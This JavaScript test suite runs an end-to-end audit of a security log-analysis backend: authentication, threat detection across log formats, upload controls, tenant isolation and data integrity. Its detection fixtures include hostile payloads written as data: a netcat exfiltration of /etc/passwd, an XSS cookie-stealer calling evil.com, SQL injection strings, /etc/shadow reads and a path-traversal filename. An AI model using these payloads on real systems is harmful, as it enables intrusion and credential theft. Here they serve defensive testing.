/**
 * complete_project_checkup.js
 * AegisSphere Master 34-Point End-to-End Project Audit & Functional Verification Suite.
 * Executes live against Express backend & MongoDB Atlas with zero mock data.
 */

process.env.NODE_ENV = "test";

const path = require("path");
const fs = require("fs");
const mongoose = require("mongoose");
const dotenv = require("dotenv");

dotenv.config({ path: path.join(__dirname, "../../.env") });

const API_BASE = "http://127.0.0.1:5000/api";
const MONGO_URI = process.env.MONGO_URI || process.env.MONGODB_URI || "mongodb://127.0.0.1:27017/aegissphere";

// Models
const User = require("../models/User");
const Log = require("../models/Log");
const Threat = require("../models/Threat");
const Incident = require("../models/Incident");
const Report = require("../models/Report");
const AdminAuditLog = require("../models/AdminAuditLog");

const safeFetch = async (url, options = {}, retries = 3, delay = 500) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      return await globalThis.fetch(url, options);
    } catch (err) {
      if (attempt === retries) throw err;
      await new Promise((r) => setTimeout(r, delay));
    }
  }
};

const runMasterAudit = async () => {
  console.log("================================================================================");
  console.log("AEGISSPHERE: COMPREHENSIVE END-TO-END PROJECT AUDIT & SYSTEM CHECKUP");
  console.log("================================================================================\n");

  const results = [];
  const record = (dimension, testName, passed, details = {}) => {
    results.push({ dimension, testName, passed, details });
    const tag = passed ? "[PASS]" : "[FAIL]";
    console.log(`   ${tag} [${dimension}] ${testName} ${!passed ? "-> " + JSON.stringify(details) : ""}`);
  };

  // ---------------------------------------------------------------------------
  // 1. STARTUP & ENVIRONMENT CHECK
  // ---------------------------------------------------------------------------
  console.log("--- 1. STARTUP & ENVIRONMENT CHECK ---");
  await mongoose.connect(MONGO_URI);
  record("Environment", "MongoDB Atlas connection established successfully", mongoose.connection.readyState === 1);
  record("Environment", "JWT_SECRET configured and secure", !!process.env.JWT_SECRET && process.env.JWT_SECRET.length >= 16);
  record("Environment", "MONGO_URI points to remote Atlas or configured DB", MONGO_URI.includes("mongodb"));

  // Health endpoint test
  const rootRes = await safeFetch("http://127.0.0.1:5000/");
  const rootText = await rootRes.text();
  record("Startup", "Backend server responsive on port 5000 (GET /)", rootRes.status === 200 && rootText.includes("AegisSphere Backend Running"));

  const ts = Date.now();

  // ---------------------------------------------------------------------------
  // 2. AUTHENTICATION & SESSION MANAGEMENT
  // ---------------------------------------------------------------------------
  console.log("\n--- 2. AUTHENTICATION & USER MANAGEMENT ---");

  // 2.1 User A (Analyst A)
  const userAEmail = `audit_analyst_a_${ts}@aegissphere.io`;
  const regResA = await safeFetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Audit Analyst A", email: userAEmail, password: "SecurePassword123!", role: "Admin" }), // attempt elevation
  });
  const regDataA = await regResA.json();
  const tokenA = regDataA.token;
  const userA = regDataA.user;

  record("Auth", "Public registration strictly enforces Analyst role (Privilege Escalation Defense)", regResA.status === 201 && userA.role === "Analyst");

  // 2.2 User B (Analyst B)
  const userBEmail = `audit_analyst_b_${ts}@aegissphere.io`;
  const regResB = await safeFetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Audit Analyst B", email: userBEmail, password: "SecurePassword123!", role: "Analyst" }),
  });
  const regDataB = await regResB.json();
  const tokenB = regDataB.token;
  const userB = regDataB.user;

  record("Auth", "Multiple distinct analysts register with unique credentials", regResB.status === 201 && !!tokenB && userB._id !== userA._id);

  // 2.3 Duplicate Registration Rejection
  const dupRes = await safeFetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Audit Duplicate", email: userAEmail, password: "SecurePassword123!" }),
  });
  record("Auth", "Duplicate email registration rejected with 400 Bad Request", dupRes.status === 400);

  // 2.4 Weak Password Rejection (<6 chars)
  const weakRes = await safeFetch(`${API_BASE}/auth/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Audit Weak", email: `weak_${ts}@aegis.io`, password: "123" }),
  });
  record("Auth", "Weak password (<6 chars) rejected with 400 Bad Request", weakRes.status === 400);

  // 2.5 Login with Valid Credentials
  const loginRes = await safeFetch(`${API_BASE}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: userAEmail, password: "SecurePassword123!" }),
  });
  const loginData = await loginRes.json();
  record("Auth", "Valid credentials login succeeds & returns JWT", loginRes.status === 200 && !!loginData.token);

  // 2.6 Login with Invalid Password
  const badLoginRes = await safeFetch(`${API_BASE}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: userAEmail, password: "WrongPassword999!" }),
  });
  record("Auth", "Invalid password rejected with 400 Bad Request", badLoginRes.status === 400);

  // 2.7 Password Hash Omission in Profile
  const profileRes = await safeFetch(`${API_BASE}/auth/profile`, {
    headers: { Authorization: `Bearer ${tokenA}` },
  });
  const profileData = await profileRes.json();
  record("Auth", "Profile response strictly excludes password hash or plaintext", profileRes.status === 200 && profileData.user?.password === undefined);

  // 2.8 Tampered / Missing JWT Protection
  const missingJwtRes = await safeFetch(`${API_BASE}/dashboard`);
  const tamperedJwtRes = await safeFetch(`${API_BASE}/dashboard`, {
    headers: { Authorization: "Bearer fake.tampered.token" },
  });
  record("Auth", "Missing and tampered JWT requests strictly return 401 Unauthorized", missingJwtRes.status === 401 && tamperedJwtRes.status === 401);

  const headersA = { Authorization: `Bearer ${tokenA}` };
  const headersB = { Authorization: `Bearer ${tokenB}` };

  // ---------------------------------------------------------------------------
  // 3. LOG UPLOAD PIPELINE: 13 INPUT SCENARIOS
  // ---------------------------------------------------------------------------
  console.log("\n--- 3. AUDITING 13 LOG INGESTION PIPELINE FORMATS ---");

  const helperUpload = async (content, filename, mimeType, headers) => {
    const fd = new FormData();
    fd.append("logFile", new Blob([content], { type: mimeType }), filename);
    const res = await safeFetch(`${API_BASE}/logs/upload`, {
      method: "POST",
      headers,
      body: fd,
    });
    const data = await res.json().catch(() => ({}));
    return { status: res.status, data };
  };

  // 3.1 Format 1: Clean Normal Baseline (.txt)
  const cleanTxt = `
2026-09-14T10:00:00Z web01 nginx: 10.0.0.1 - - "GET /index.html HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
2026-09-14T10:00:01Z web01 nginx: 10.0.0.2 - - "GET /assets/style.css HTTP/1.1" 200 1200 "-" "Mozilla/5.0"
`.trim();
  const up1 = await helperUpload(cleanTxt, "clean_baseline.txt", "text/plain", headersA);
  record("Pipeline", "Format 1: Clean Baseline (.txt) -> 0 threats (Zero False Positives)", up1.status === 200 && up1.data.threat === null && up1.data.log?.threatCount === 0);

  // 3.2 Format 2: OpenSSH Auth Log (.log)
  const sshLog = `
2026-09-14T10:01:00Z auth-node sshd[201]: Failed password for root from 198.51.100.11 port 40101 ssh2
2026-09-14T10:01:01Z auth-node sshd[202]: Failed password for root from 198.51.100.11 port 40102 ssh2
2026-09-14T10:01:02Z auth-node sshd[203]: Failed password for root from 198.51.100.11 port 40103 ssh2
2026-09-14T10:01:03Z auth-node sshd[204]: Failed password for root from 198.51.100.11 port 40104 ssh2
2026-09-14T10:01:04Z auth-node sshd[205]: Failed password for root from 198.51.100.11 port 40105 ssh2
2026-09-14T10:01:05Z auth-node sshd[206]: Failed password for root from 198.51.100.11 port 40106 ssh2
`.trim();
  const up2 = await helperUpload(sshLog, "openssh_auth.log", "text/plain", headersA);
  record("Pipeline", "Format 2: OpenSSH Auth (.log) -> SSH Brute Force (T1110, Critical)", up2.status === 200 && up2.data.threat?.threatType.includes("SSH Brute Force") && up2.data.threat?.mitreTechnique.includes("T1110"));

  // 3.3 Format 3: Apache Access Log (.log)
  const apacheLog = `
198.51.100.22 - - [14/Sep/2026:10:02:00 +0000] "GET /search?q=test%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 200 4500
`.trim();
  const up3 = await helperUpload(apacheLog, "apache_access.log", "text/plain", headersA);
  record("Pipeline", "Format 3: Apache Access Log (.log) -> SQLi in URI query string detected", up3.status === 200 && up3.data.threat?.threatType.includes("SQL Injection"));

  // 3.4 Format 4: SQL Injection Payload (.csv)
  const sqliCsv = `timestamp,source_ip,method,uri,status
2026-09-14T10:03:00Z,198.51.100.33,POST,/api/login?user=admin'%20OR%20'1'='1,200`;
  const up4 = await helperUpload(sqliCsv, "db_access.csv", "text/csv", headersA);
  record("Pipeline", "Format 4: SQLi Structured CSV (.csv) -> T1190 Exploit detected", up4.status === 200 && up4.data.threat?.threatType.includes("SQL Injection") && up4.data.threat?.mitreTechnique.includes("T1190"));

  // 3.5 Format 5: Brute Force (.log)
  const bruteLog = `
2026-09-14T10:04:00Z edge-firewall sshd[501]: Failed password for admin from 198.51.100.44 port 51100 ssh2
2026-09-14T10:04:01Z edge-firewall sshd[502]: Failed password for admin from 198.51.100.44 port 51101 ssh2
2026-09-14T10:04:02Z edge-firewall sshd[503]: Failed password for admin from 198.51.100.44 port 51102 ssh2
2026-09-14T10:04:03Z edge-firewall sshd[504]: Failed password for admin from 198.51.100.44 port 51103 ssh2
2026-09-14T10:04:04Z edge-firewall sshd[505]: Failed password for admin from 198.51.100.44 port 51104 ssh2
`.trim();
  const up5 = await helperUpload(bruteLog, "brute_force.log", "text/plain", headersA);
  record("Pipeline", "Format 5: Brute Force (.log) -> Source IP 198.51.100.44 parsed correctly", up5.status === 200 && up5.data.threat?.sourceIp === "198.51.100.44");

  // 3.6 Format 6: Command Injection / RCE (.json)
  const rceJson = JSON.stringify([
    {
      timestamp: "2026-09-14T10:05:00Z",
      source_ip: "198.51.100.55",
      command: "cat /etc/passwd | nc 198.51.100.55 4444",
      user: "www-data",
    },
  ]);
  const up6 = await helperUpload(rceJson, "rce_events.json", "application/json", headersA);
  record("Pipeline", "Format 6: Command Injection / RCE (.json) -> T1059 Critical", up6.status === 200 && up6.data.threat?.threatType.includes("Command Injection") && up6.data.threat?.severity === "Critical");

  // 3.7 Format 7: Reflected XSS (.log)
  const xssLog = `
2026-09-14T10:06:00Z edge-proxy: 198.51.100.66 - - "GET /profile?name=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200
`.trim();
  const up7 = await helperUpload(xssLog, "xss_audit.log", "text/plain", headersA);
  record("Pipeline", "Format 7: Reflected XSS (.log) -> T1059.007 JavaScript XSS detected", up7.status === 200 && up7.data.threat?.threatType.includes("XSS"));

  // 3.8 Format 8: Port Scanning / Sweep (.log)
  const portScanLog = `
198.51.100.77 - - [2026-09-14T10:07:00Z] connection refused on port 21 (FTP) - SYN scan probe
198.51.100.77 - - [2026-09-14T10:07:01Z] connection refused on port 22 (SSH) - SYN scan probe
198.51.100.77 - - [2026-09-14T10:07:02Z] connection refused on port 23 (Telnet) - SYN scan probe
198.51.100.77 - - [2026-09-14T10:07:03Z] connection refused on port 80 (HTTP) - port scan probe
198.51.100.77 - - [2026-09-14T10:07:04Z] connection refused on port 443 (HTTPS) - port scan probe
198.51.100.77 - - [2026-09-14T10:07:05Z] connection refused on port 3306 (MySQL) - SYN scan probe
198.51.100.77 - - [2026-09-14T10:07:06Z] connection refused on port 8080 (HTTP-Alt) - Nmap scan probe
`.trim();
  const up8 = await helperUpload(portScanLog, "port_sweep.log", "text/plain", headersA);
  record("Pipeline", "Format 8: Port Scan / Sweep (.log) -> T1595 Active Scanning Low severity", up8.status === 200 && up8.data.threat?.mitreTechnique.includes("T1595"));

  // 3.9 Format 9: Mixed Traffic (.log)
  const mixedLog = `
2026-09-14T10:08:00Z web01 nginx: 10.0.0.1 - - "GET /about.html HTTP/1.1" 200 1200
2026-09-14T10:08:01Z web01 nginx: 10.0.0.2 - - "GET /faq.html HTTP/1.1" 200 900
2026-09-14T10:08:02Z web01 nginx: 198.51.100.88 - - "GET /admin?cmd=;cat%20/etc/shadow HTTP/1.1" 403 200
2026-09-14T10:08:03Z web01 nginx: 10.0.0.3 - - "GET /contact.html HTTP/1.1" 200 800
`.trim();
  const up9 = await helperUpload(mixedLog, "mixed_telemetry.log", "text/plain", headersA);
  record("Pipeline", "Format 9: Mixed Traffic (.log) -> Isolates command injection accurately", up9.status === 200 && up9.data.threat?.threatType.includes("Command Injection"));

  // 3.10 Format 10: Structured CSV (.csv)
  const structuredCsv = `timestamp,source_ip,method,uri,status
2026-09-14T10:09:00Z,198.51.100.99,GET,/api/data,200
2026-09-14T10:09:01Z,198.51.100.99,GET,/api/items,200`;
  const up10 = await helperUpload(structuredCsv, "structured_traffic.csv", "text/csv", headersA);
  record("Pipeline", "Format 10: Structured CSV (.csv) -> Parses column headers & rows properly", up10.status === 200 && up10.data.log?.fileFormat === ".csv");

  // 3.11 Format 11: Structured JSON (.json)
  const structuredJson = JSON.stringify([
    { timestamp: "2026-09-14T10:10:00Z", source_ip: "10.1.1.1", action: "ALLOW", status: 200 },
    { timestamp: "2026-09-14T10:10:01Z", source_ip: "10.1.1.2", action: "ALLOW", status: 200 },
  ]);
  const up11 = await helperUpload(structuredJson, "normal_events.json", "application/json", headersA);
  record("Pipeline", "Format 11: Structured JSON (.json) -> Parses array events without error", up11.status === 200 && up11.data.log?.fileFormat === ".json");

  // 3.12 Format 12: Malformed / Unstructured Log
  const malformedLog = "---GARBLED UNFORMATTED RAW HEX CHUNKS FF00E4A198B22 NO HEADERS---";
  const up12 = await helperUpload(malformedLog, "malformed.log", "text/plain", headersA);
  record("Pipeline", "Format 12: Malformed log handled safely without crashing server", up12.status === 200);

  // 3.13 Format 13: Empty File (0 Bytes)
  const up13 = await helperUpload("", "empty_zero_byte.log", "text/plain", headersA);
  record("Pipeline", "Format 13: Empty file (0 bytes) processed safely (0 threats generated)", up13.status === 200 && up13.data.threat === null);

  // ---------------------------------------------------------------------------
  // 4. FILE UPLOAD SECURITY & RESTRICTION CONTROLS
  // ---------------------------------------------------------------------------
  console.log("\n--- 4. FILE UPLOAD SECURITY CONTROLS ---");

  // 4.1 Disallowed Extension (.exe)
  const upExe = await helperUpload("BINARY_EXEC", "exploit.exe", "application/x-msdownload", headersA);
  record("Security", "Disallowed file extension (.exe) rejected with 400 Bad Request", upExe.status === 400);

  // 4.2 Path Traversal in Filename
  const boundaryStr = "----AuditFormBoundaryXyZ789";
  const traversalPayload = [
    `--${boundaryStr}`,
    'Content-Disposition: form-data; name="logFile"; filename="../../traversal.log"',
    "Content-Type: text/plain",
    "",
    "127.0.0.1 GET /health 200",
    `--${boundaryStr}--`,
    "",
  ].join("\r\n");

  const upTravRes = await safeFetch(`${API_BASE}/logs/upload`, {
    method: "POST",
    headers: {
      ...headersA,
      "Content-Type": `multipart/form-data; boundary=${boundaryStr}`,
    },
    body: traversalPayload,
  });
  const travData = upTravRes.status === 200 ? await upTravRes.json() : null;
  const isTravHandled =
    upTravRes.status === 400 ||
    (upTravRes.status === 200 &&
      travData?.log &&
      !travData.log.filename.includes("..") &&
      !travData.log.filename.includes("/") &&
      !travData.log.filename.includes("\\"));
  record("Security", "Path traversal characters in filename safely rejected or sanitized (Zero breakout)", isTravHandled);

  // ---------------------------------------------------------------------------
  // 5. USER ISOLATION & IDOR DEFENSE (USER A vs USER B)
  // ---------------------------------------------------------------------------
  console.log("\n--- 5. USER ISOLATION & IDOR DEFENSE ---");

  // User B uploads one independent log
  const upUserB = await helperUpload(sshLog, "user_b_ssh.log", "text/plain", headersB);
  const userBLogId = upUserB.data.log._id;
  const userBThreatId = upUserB.data.threat._id;
  const userBReportId = upUserB.data.report._id;

  // User A attempts to view User B's log
  const idorLogRes = await safeFetch(`${API_BASE}/logs/${userBLogId}`, { headers: headersA });
  record("IDOR", "Cross-tenant Log access blocked (Analyst A cannot view Analyst B log)", idorLogRes.status === 403 || idorLogRes.status === 404);

  // User A attempts to delete User B's log
  const idorDelLogRes = await safeFetch(`${API_BASE}/logs/${userBLogId}`, {
    method: "DELETE",
    headers: headersA,
  });
  record("IDOR", "Cross-tenant Log deletion blocked (Analyst A cannot delete Analyst B log)", idorDelLogRes.status === 403 || idorDelLogRes.status === 404);

  // User A attempts to download User B's report PDF
  const idorPdfRes = await safeFetch(`${API_BASE}/reports/${userBReportId}/pdf`, { headers: headersA });
  record("IDOR", "Cross-tenant PDF download strictly rejected with 403 Forbidden", idorPdfRes.status === 403);

  // User A attempts to trigger AI analysis on User B's threat
  const idorAiRes = await safeFetch(`${API_BASE}/ai/analyze-threat/${userBThreatId}`, {
    method: "POST",
    headers: headersA,
  });
  record("IDOR", "Cross-tenant AI analysis execution blocked (403 Forbidden)", idorAiRes.status === 403);

  // ---------------------------------------------------------------------------
  // 6. REAL CRUD & BIDIRECTIONAL MONGODB REFLECTION
  // ---------------------------------------------------------------------------
  console.log("\n--- 6. CRUD & BIDIRECTIONAL DATABASE REFLECTION ---");

  const targetThreat = up2.data.threat;
  const targetLog = up2.data.log;

  // 6.1 CREATE Incident via API
  const createIncRes = await safeFetch(`${API_BASE}/incidents`, {
    method: "POST",
    headers: { ...headersA, "Content-Type": "application/json" },
    body: JSON.stringify({
      title: "Active Perimeter SSH Breach Incursion",
      severity: "Critical",
      threatId: targetThreat._id,
      logId: targetLog._id,
      assignedTo: userA._id,
      description: "Automated credential defense triage ticket.",
    }),
  });
  const incData = await createIncRes.json();
  const createdIncident = incData.incident;
  record("CRUD", "CREATE: Incident ticket created successfully via API", createIncRes.status === 201 && !!createdIncident?._id);

  // Verify MongoDB document exists in Atlas directly
  const dbInc = await Incident.findById(createdIncident._id);
  record("CRUD", "CREATE: Incident persisted directly to MongoDB Atlas collection", !!dbInc && dbInc.title === "Active Perimeter SSH Breach Incursion");

  // 6.2 UPDATE Incident via API
  const updateIncRes = await safeFetch(`${API_BASE}/incidents/${createdIncident._id}`, {
    method: "PATCH",
    headers: { ...headersA, "Content-Type": "application/json" },
    body: JSON.stringify({ status: "Investigating" }),
  });
  record("CRUD", "UPDATE: Incident status updated to 'Investigating' via API", updateIncRes.status === 200);

  // Verify MongoDB Atlas reflects the update
  const dbIncUpdated = await Incident.findById(createdIncident._id);
  record("CRUD", "UI -> MongoDB: Atlas document reflects 'Investigating' status", dbIncUpdated.status === "Investigating");

  // 6.3 ADD Action History to Incident
  const addActionRes = await safeFetch(`${API_BASE}/incidents/${createdIncident._id}/actions`, {
    method: "POST",
    headers: { ...headersA, "Content-Type": "application/json" },
    body: JSON.stringify({ action: "WAF IP Rate-Limit Applied", notes: "Applied rate-limiting policy at edge gateway." }),
  });
  const actionData = await addActionRes.json();
  record("CRUD", "UPDATE: Incident action history appended in MongoDB audit trail", addActionRes.status === 200 && actionData.incident.actionHistory.some((a) => a.action === "WAF IP Rate-Limit Applied"));

  // 6.4 MONGODB -> UI REFLECTION TEST
  // Manually update title directly in MongoDB Atlas, then verify API immediately serves the updated title
  const newManualTitle = `Atlas Direct Synchronized Title [${ts}]`;
  await Incident.findByIdAndUpdate(createdIncident._id, { title: newManualTitle });

  const readIncRes = await safeFetch(`${API_BASE}/incidents/${createdIncident._id}`, { headers: headersA });
  const readIncData = await readIncRes.json();
  record("Reflection", "MongoDB -> UI: Direct Atlas modification immediately reflected in API response (Zero stale cache)", readIncRes.status === 200 && readIncData.incident.title === newManualTitle);

  // ---------------------------------------------------------------------------
  // 7. CASCADE DELETION & ORPHAN PREVENTION
  // ---------------------------------------------------------------------------
  console.log("\n--- 7. CASCADE DELETION & INTEGRITY ---");

  // Deleting targetLog should cascade delete targetThreat, associated Report, and linked Incident
  const delLogRes = await safeFetch(`${API_BASE}/logs/${targetLog._id}`, {
    method: "DELETE",
    headers: headersA,
  });
  record("Cascade", "DELETE: Log deletion request succeeds (200 OK)", delLogRes.status === 200);

  // Verify all 4 related documents are purged from Atlas
  const checkLog = await Log.findById(targetLog._id);
  const checkThreat = await Threat.findById(targetThreat._id);
  const checkReport = await Report.findOne({ logId: targetLog._id });
  const checkIncident = await Incident.findById(createdIncident._id);

  record("Cascade", "Cascade cleans Log, Threat, Report, and Incident (0 Orphan Records)", checkLog === null && checkThreat === null && checkReport === null && checkIncident === null);

  // Verify User B's telemetry remained 100% unaffected
  const checkUserBLog = await Log.findById(userBLogId);
  const checkUserBThreat = await Threat.findById(userBThreatId);
  record("Cascade", "Cascade Deletion Isolation: User B telemetry remained 100% untouched in Atlas", checkUserBLog !== null && checkUserBThreat !== null);

  // ---------------------------------------------------------------------------
  // 8. DASHBOARD REAL-DATA METRICS
  // ---------------------------------------------------------------------------
  console.log("\n--- 8. DASHBOARD REAL-DATA AGGREGATION ---");

  const dashRes = await safeFetch(`${API_BASE}/dashboard`, { headers: headersA });
  const dashData = await dashRes.json();

  const actualUserALogs = await Log.countDocuments({ uploadedBy: userA._id });
  const userALogDocs = await Log.find({ uploadedBy: userA._id }).select("_id");
  const userALogIds = userALogDocs.map((l) => l._id);
  const actualUserAThreats = await Threat.countDocuments({ logId: { $in: userALogIds } });

  record("Dashboard", "Dashboard totalLogs matches exact MongoDB query count", dashRes.status === 200 && dashData.stats.totalLogs === actualUserALogs);
  record("Dashboard", "Dashboard totalThreats matches exact MongoDB query count", dashRes.status === 200 && dashData.stats.totalThreats === actualUserAThreats);
  record("Dashboard", "Dashboard returns live 7-day threat trend array with real data", Array.isArray(dashData.threatTrend) && dashData.threatTrend.length === 7);

  // ---------------------------------------------------------------------------
  // 9. PDF REPORT GENERATION & STREAMING
  // ---------------------------------------------------------------------------
  console.log("\n--- 9. PDF REPORT GENERATION & PRESENTATION ---");

  // Use userB's report which is intact
  const pdfRes = await safeFetch(`${API_BASE}/reports/${userBReportId}/pdf`, { headers: headersB });
  const pdfBuf = Buffer.from(await pdfRes.arrayBuffer());

  record("PDF", "Server streams authentic binary PDF with %PDF- header", pdfRes.status === 200 && pdfBuf.slice(0, 5).toString() === "%PDF-");
  record("PDF", "PDF byte size is substantive (> 1000 bytes)", pdfBuf.length > 1000);

  // ---------------------------------------------------------------------------
  // 10. GEMINI AI STATUS & RESILIENCE
  // ---------------------------------------------------------------------------
  console.log("\n--- 10. GEMINI AI SERVICE STATUS ---");

  const aiStatusRes = await safeFetch(`${API_BASE}/ai/status`, { headers: headersA });
  const aiStatusData = await aiStatusRes.json();
  record("AI", "GET /api/ai/status returns valid operational JSON payload", aiStatusRes.status === 200 && typeof aiStatusData.configured === "boolean");

  // ---------------------------------------------------------------------------
  // 11. SECURITY TEST LAB CONTROLLED SANDBOX
  // ---------------------------------------------------------------------------
  console.log("\n--- 11. SECURITY TEST LAB SANDBOX ---");

  const labRes = await safeFetch(`${API_BASE}/attack-tests/generate`, {
    method: "POST",
    headers: { ...headersA, "Content-Type": "application/json" },
    body: JSON.stringify({ attackType: "Port Scanning" }),
  });
  const labData = await labRes.json();
  record("TestLab", "Security Test Lab executes through identical 4-agent pipeline & labels simulation", labRes.status === 201 && labData.threat?.threatType.includes("Controlled Simulation"));

  // ---------------------------------------------------------------------------
  // 12. CLEANUP DISPOSABLE TEST USERS
  // ---------------------------------------------------------------------------
  console.log("\n--- 12. AUDIT CLEANUP ---");
  await User.deleteMany({ _id: { $in: [userA._id, userB._id] } });
  await Log.deleteMany({ uploadedBy: { $in: [userA._id, userB._id] } });
  console.log("✓ Audit test users and associated test artifacts cleaned up.\n");

  await mongoose.disconnect();

  // ---------------------------------------------------------------------------
  // SUMMARY
  // ---------------------------------------------------------------------------
  console.log("================================================================================");
  const total = results.length;
  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed).length;

  console.log(`MASTER AUDIT COMPLETE: ${passed}/${total} TESTS PASSED (${failed} FAILED)`);
  console.log("================================================================================");

  return { total, passed, failed, results };
};

runMasterAudit().catch((err) => {
  console.error("FATAL MASTER AUDIT ERROR:", err);
  process.exit(1);
});
